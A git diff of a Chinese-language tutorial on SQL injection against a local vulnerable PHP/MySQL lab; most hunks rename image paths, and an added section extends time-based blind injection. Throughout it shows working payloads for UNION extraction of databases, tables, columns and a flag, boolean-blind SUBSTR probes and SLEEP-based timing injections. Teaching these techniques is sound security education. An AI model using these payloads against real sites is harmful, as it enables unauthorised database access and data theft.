@@ -186,11 +186,11 @@ FROM users
 ORDER BY 2;
 ```
 
-> <img src="./img3/42.png">
+> <img src="./IMG3/42.png">
 
 当`ORDER BY`后的参数为字段序号时，序号不能超过数据表中的字段数量，如当前表中存在3个字段，使用`ORDER BY 4`则会报错
 
-> <img src="./img3/41.png">
+> <img src="./IMG3/41.png">
 
 攻击者恰好可以利用这个报错来泄露当前数据表中的字段数量
 
@@ -228,11 +228,11 @@ UNION
 SELECT 5,6,7;
 ```
 
-> <img src="./img3/40.png">
+> <img src="./IMG3/40.png">
 
 在进行`UNION`联合查询时，必须保证前后两张表的字段数量完全一致，否则会报错
 
-> <img src="./img3/39.png">
+> <img src="./IMG3/39.png">
 
 因此，`UNION`联合注入在一定程度上可以代替`ORDER BY`来判断字段数量，但`UNION`联合注入的功能要更强大，因为`UNION`后的`SELECT`可以查询任意内容
 
@@ -296,7 +296,7 @@ if (isset($_POST['username'])) {
 
 先进行合法的查询，输入`admin`
 
-> <img src="./img3/38.png">
+> <img src="./IMG3/38.png">
 
 如图所示，后台返回了`admin`的`id`以及`username`字段。
 
@@ -322,7 +322,7 @@ if (isset($_POST['username'])) {
 
 例如上面的`payload`，已知数据表中有三个字段，那么我们就在`UNION`后面的`SELECT`中使用`1,2,3`来标记三个字段，如果前端显示了`1,2`，那么就可以使用`1,2`字段的位置显示其他内容
 
-> <img src="./img3/37.png">
+> <img src="./IMG3/37.png">
 
 **为什么有时候仍然显示合法查询的内容？**
 
@@ -345,7 +345,7 @@ echo "用户: " . $row['username'] . "<br>";
 
 此时输入`1' UNION SELECT 1,2,3#`就会发现，前端只显示`id`为5的用户信息，而不是`id = 1`和`username = 2`
 
-> <img src="./img3/36.png">
+> <img src="./IMG3/36.png">
 
 这主要是查询记录的默认排序导致的，一般来说，`UNION`联合查询的查询内容会排在主查询之后，输入`1' UNION SELECT 1,2,3#`时，主查询能取得一条记录，子查询也能取得一条记录，而恰好前端又只显示一条记录，于是排在第一位的主查询的合法记录就会显示在前端
 
@@ -355,7 +355,7 @@ echo "用户: " . $row['username'] . "<br>";
 0' UNION SELECT 1,2,3#
 ```
 
-> <img src="./img3/35.png">
+> <img src="./IMG3/35.png">
 
 ##### 获取敏感信息
 
@@ -369,7 +369,7 @@ echo "用户: " . $row['username'] . "<br>";
 0' UNION SELECT DATABASE(),2,3#
 ```
 
-> <img src="./img3/34.png">
+> <img src="./IMG3/34.png">
 
 ###### information_schema
 
@@ -459,13 +459,13 @@ echo "用户: " . $row['username'] . "<br>";
 ' UNION SELECT SCHEMA_NAME,2,3 FROM information_schema.schemata#
 ```
 
-> <img src="./img3/33.png">
+> <img src="./IMG3/33.png">
 
 **为什么只显示mysql？**
 
 我们先尝试直接在MySQL中直接进行查询
 
-> <img src="./img3/32.png">
+> <img src="./IMG3/32.png">
 
 不难发现，获取的结果是一张表，而前端只显示其中的一条记录，因此我们需要让一张表变为一行
 
@@ -473,7 +473,7 @@ echo "用户: " . $row['username'] . "<br>";
 
 `GROUP_CONCAT()`是SQL中的一个聚合函数，它用于将来自某个分组的多个行的列值连接成一个单独的字符串
 
-> <img src="./img3/31.png">
+> <img src="./IMG3/31.png">
 
 很显然，`GROUP_CONCAT`将`SCHEMA_NAME`的所有记录连接成为了一个单独的字符串，并用逗号分隔
 
@@ -483,7 +483,7 @@ echo "用户: " . $row['username'] . "<br>";
 ' UNION SELECT GROUP_CONCAT(SCHEMA_NAME),2,3 FROM information_schema.schemata#
 ```
 
-> <img src="./img3/30.png">
+> <img src="./IMG3/30.png">
 
 在获得的所有数据库中，`mysql`、`information_schema`、`performance_schema`、`sys`都是系统自带表，一般可以直接忽略
 
@@ -495,7 +495,7 @@ echo "用户: " . $row['username'] . "<br>";
 ' UNION SELECT GROUP_CONCAT(TABLE_NAME),DATABASE(),3 FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()#
 ```
 
-> <img src="./img3/29.png">
+> <img src="./IMG3/29.png">
 
 这里需要注意，在`information_schema.tables`中，表所属数据库的字段名为`TABLE_SCHEMA`，而不是之前的`SCHEMA_NAME`，而且因为当前数据库正好是`test`，所以可以使用`DATABASE()`来代替
 
@@ -507,7 +507,7 @@ echo "用户: " . $row['username'] . "<br>";
 ' UNION SELECT GROUP_CONCAT(COLUMN_NAME),DATABASE(),3 FROM information_schema.columns WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='flag'#
 ```
 
-> <img src="./img3/28.png">
+> <img src="./IMG3/28.png">
 
 ###### 泄露字段值
 
@@ -517,7 +517,7 @@ echo "用户: " . $row['username'] . "<br>";
 ' UNION SELECT flag,2,3 FROM flag#
 ```
 
-> <img src="./img3/27.png">
+> <img src="./IMG3/27.png">
 
 最终，我们成功获取了`flag`
 
@@ -599,7 +599,7 @@ if (isset($_POST['username'])) {
 
 这道题将所有的报错全部关闭了，取而代之的是`"输入的用户名不存在"`一句话
 
-> <img src="./img3/26.png">
+> <img src="./IMG3/26.png">
 
 ###### 判断漏洞类型
 
@@ -612,15 +612,15 @@ if (isset($_POST['username'])) {
 
 下面我们使用上方的例子来判断漏洞类型，首先输入`1`，保证有数据结果
 
-> <img src="./img3/25.png">
+> <img src="./IMG3/25.png">
 
 然后输入`1'`，提示`输入的用户名不存在`
 
-> <img src="./img3/24.png">
+> <img src="./IMG3/24.png">
 
 再输入`1'#`，发现结果与`1`相同
 
-> <img src="./img3/23.png">
+> <img src="./IMG3/23.png">
 
 到这里就可以确定是单引号注入类型，我们传入的`'`将后台本身存在的前引号闭合，`#`将后台本身存在的后引号注释掉，就构成了语法正确的SQL语句
 
@@ -630,11 +630,11 @@ if (isset($_POST['username'])) {
 
 输入`1' ORDER BY 5#`，提示`输入的用户名不存在`
 
-> <img src="./img3/22.png">
+> <img src="./IMG3/22.png">
 
 输入`1' ORDER BY 3#`，返回内容与`1`相同
 
-> <img src="./img3/21.png">
+> <img src="./IMG3/21.png">
 
 由此可见，布尔盲注的实质是攻击者将注意力重心放在“返回结果是否变化”上，而非先前注重“是否报错”，这与布尔值本身类似，我们将返回正常内容视为`TRUE`，返回异常内容或无返回内容视为`FALSE`，因此被称为`布尔盲注`
 
@@ -697,7 +697,7 @@ if (isset($_POST['username'])) {
 1' UnIOn SELECT 1,2,3#
 ```
 
-> <img src="./img3/20.png">
+> <img src="./IMG3/20.png">
 
 现在我们来正式进行注入，根据以往经验，现在要输入的payload为
 
@@ -707,7 +707,7 @@ if (isset($_POST['username'])) {
 
 由于`UNION`被过滤，只能使用其他方式。根据已知的函数`LENGTH()`，它能否返回一个查询结果的长度，如果我们在它的后面使用比较符`>`、`<`和`=`，就能精确判断该查询结果的长度，例如我们判断当前数据库名的长度
 
-> <img src="./img3/19.png">
+> <img src="./IMG3/19.png">
 
 很显然，在`SELECT LENGTH(DATABASE())=4;`时SQL返回`TRUE`，因此该数据库名的长度为4，所以借助这个特性，我们使用`AND`将正常的查询结果与`LENGTH()`拼接，如果`LENGTH()`返回`TRUE`，最终前端返回的结果就为`AND`前面查询的正常结果，如果`LENGTH()`返回`FALSE`，`AND`运算结果也为`FALSE`，最终前端显示查询失败
 
@@ -715,27 +715,27 @@ if (isset($_POST['username'])) {
 1' AND LENGTH(DATABASE())>5#
 ```
 
-> <img src="./img3/18.png">
+> <img src="./IMG3/18.png">
 
 ```sql
 1' AND LENGTH(DATABASE())=4#
 ```
 
-> <img src="./img3/17.png">
+> <img src="./IMG3/17.png">
 
 *注：这里可以使用 `>=` 和 `<=`*
 
 现在我们已经知道了数据库名的长度，接下来是泄露数据名的内容，这里就要利用`SUBSTR()`函数了，与`LENGTH()`类似，如果我们在其后面使用比较符，就能够作为一个判断语句使用
 
-> <img src="./img3/16.png">
+> <img src="./IMG3/16.png">
 
 如上图所示，`SELECT SUBSTR(DATABASE(),1,1)>'u';`为`FALSE`，`SELECT SUBSTR(DATABASE(),1,1)>'p';`为`TRUE`，因此就可以确定数据库名的第一个字符位于`p`和`u`之间，因为尝试的次数比较多，可以使用二分法加快查询效率
 
-> <img src="./img3/15.png">
+> <img src="./IMG3/15.png">
 
 最终我们就能得知数据库名的第一个字符是`t`，而第二个字符仅需要修改`SUBSTR()`的第二参数`start_pos`即可
 
-> <img src="./img3/14.png">
+> <img src="./IMG3/14.png">
 
 然后，我们同样使用`AND`来拼接正常查询的内容，通过是否返回正常数据来判断`AND`后面拼接的`SUBSTR()`是否返回`TRUE`
 
@@ -743,19 +743,19 @@ if (isset($_POST['username'])) {
 1' AND SUBSTR(DATABASE(),1,1)>'q'#
 ```
 
-> <img src="./img3/13.png">
+> <img src="./IMG3/13.png">
 
 ```sql
 1' AND SUBSTR(DATABASE(),1,1)>'v'#
 ```
 
-> <img src="./img3/12.png">
+> <img src="./IMG3/12.png">
 
 ```sql
 1' AND SUBSTR(DATABASE(),1,1)='t'#
 ```
 
-> <img src="./img3/11.png">
+> <img src="./IMG3/11.png">
 
 以此类推，就可以得到当前的数据库名
 
@@ -767,7 +767,7 @@ if (isset($_POST['username'])) {
 
 在开始编写脚本之前，我们首先需要知道前端向后端发送的请求包的格式，以及传入的参数，这可以使用抓包来获取
 
-> <img src="./img3/10.png">
+> <img src="./IMG3/10.png">
 
 观察这个请求包，可以得知使用的是`POST`请求方式，请求的`url`是`localhost/sql-injection/blind.php`，请求体中的参数名为`username`。知道这些信息，我们就能着手编写注入脚本了
 
@@ -831,7 +831,7 @@ for i in range(1, length + 1):
 
 由于字符集中包含大小写字母，而数据库名对大小写不敏感，因此结果中会同时出现大小写字母
 
-> <img src="./img3/9.png">
+> <img src="./IMG3/9.png">
 
 *解决方法也很简单，这里留给读者自己解决*
 
@@ -839,7 +839,7 @@ for i in range(1, length + 1):
 
 泄露数据表的步骤与泄露数据库相同，只需要将`SUBSTR()`函数的第一个参数改为一个查询语句即可
 
-> <img src="./img3/8.png">
+> <img src="./IMG3/8.png">
 
 在这道题中，`SUBSTR()`中使用的查询语句即为普通注入时的查询语句，即
 
@@ -847,7 +847,7 @@ for i in range(1, length + 1):
 SELECT SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),1,1);
 ```
 
-> <img src="./img3/7.png">
+> <img src="./IMG3/7.png">
 
 现在我们在题目中实际注入
 
@@ -855,19 +855,19 @@ SELECT SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WH
 1' AND SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),1,1)>'a'#
 ```
 
-> <img src="./img3/6.png">
+> <img src="./IMG3/6.png">
 
 ```sql
 1' AND SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),1,1)>'g'#
 ```
 
-> <img src="./img3/5.png">
+> <img src="./IMG3/5.png">
 
 ```sql
 1' AND SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),1,1)='f'#
 ```
 
-> <img src="./img3/4.png">
+> <img src="./IMG3/4.png">
 
 最后我们就能得知`test`数据库中某一张表名的第一个字符为`f`
 
@@ -906,11 +906,11 @@ print(table_name)
 SELECT LENGTH((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()));
 ```
 
-> <img src="./img3/3.png">
+> <img src="./IMG3/3.png">
 
 然后使用脚本爆破
 
-> <img src="./img3/2.png">
+> <img src="./IMG3/2.png">
 
 ###### 泄露字段名
 
@@ -945,7 +945,7 @@ print(column_name)
 
 运行脚本，得到字段名
 
-> <img src="./img3/1.png">
+> <img src="./IMG3/1.png">
 
 ###### 泄露字段值
 
@@ -978,7 +978,7 @@ for i in range(1, max_len + 1):
 print(value)
 ```
 
-> <img src="./img3/45.png">
+> <img src="./IMG3/45.png">
 
 ##### 时间盲注
 
@@ -995,7 +995,7 @@ print(value)
 SELECT IF(SUBSTR((DATABASE()),1,1)>'a',SLEEP(3),1);
 ```
 
-> <img src="./img3/46.png">
+> <img src="./IMG3/46.png">
 
 使用`IF()`判断`SUBSTR()`的结果是否为真，当结果为真时，使用`SLEEP()`延迟三秒，结果为假时，返回`1`。因此在进行第一次查询时，结果为真，查询时间为`3.01`秒，并且返回结果`0`，第二次查询时，结果为假，直接返回`1`
 
@@ -1043,10 +1043,77 @@ if (isset($_POST['username'])) {
     $username = $_POST['username'];
     $conn = new mysqli("localhost", "root", "root", "test");
     $sql = "SELECT * FROM users WHERE username = '$username'";
+    $start = microtime(true);
     $result = $conn->query($sql);
-    echo '查询完成！';
+    $end = microtime(true);
+    $executionTime = $end - $start;
+    echo '查询完成！' . "<br>";
+    echo "查询用时: " . number_format($executionTime, 1) . " 秒";
 }
 ```
 
 从后端代码就能够看出，这是一道仅能使用时间盲注的题目，因为无论查询结果为何，前端永远只显示`查询完成！`
 
+###### 判断漏洞类型
+
+仅从判断漏洞类型开始，时间盲注就与其他注入类有较大差异，因为我们不再能从页面回显来判断，而是通过我们自己构造的第三维变量`时间`
+
+那么该如何开始呢？想要清楚注入的漏洞类型，实际是在了解用哪种方式可以截断后台的SQL语句，如下
+
+```sql
+SELECT 1 FROM users WHERE username='1' AND SELECT 1#'
+```
+
+
+
+我们传入单引号，后台的单引号被闭合，SQL语句被截断，因此我们能够确定漏洞类型为单引号注入
+
+同样的
+
+```php
+SELECT 1 FROM users WHERE username='1" AND 1=1#'
+```
+
+当我们传入双引号，单引号无法被闭合，数据库将`1" AND 1=1#`直接作为`id`字段值，因此页面无内容
+
+由上文可知，当引号被闭合时，后方的语句能正常执行，若我们将刚才的
+
+```sql
+SELECT 1 FROM users WHERE username='1' AND SELECT 1#'
+```
+
+更改为
+
+```sql
+SELECT 1 FROM users WHERE username='1' OR IF(1=1,SLEEP(2),1)#'
+```
+
+是否就可以作为漏洞类型的判断依据，因为只有正确闭合了引号，后台才会执行`SLEEP(2)`
+
+回到题目上，先进行一次正常查询
+
+> <img src="./IMG3/{666566D2-418B-4AA0-B582-EA349BF46AF9}.png">
+
+然后我们传入`0' OR IF(1=1,SLEEP(1),1)#`
+
+> <img src="./IMG3/{20C9C5DF-9BB7-4502-9CEC-8F7790EB6C9C}.png">
+
+很巧妙地发现，查询用时增加了，但我们传入的是`SLEEP(1)`，为什么是5秒？
+
+因为在SQL中，`WHERE`子句对每条查询记录都生效，在`users`表中，共有五条记录，每条记录都会执行一次`SLEEP(1)`
+
+```sql
+SELECT *
+FROM users
+WHERE IF(1=1,SLEEP(1),1);
+```
+
+> <img src="./IMG3/{43CA8D67-75F9-42D8-82D7-6EEB1EDFAFC7}.png">
+
+为了避免表中记录过多导致长时间等待的情况，可以使用派生表来限制查询次数
+
+```sql
+0' OR (SELECT 1 FROM (SELECT IF(1=1,SLEEP(1),1)) AS a)#
+```
+
+> <img src="./IMG3/{20B5AB62-4044-4675-A09B-79226DC93463}.png">
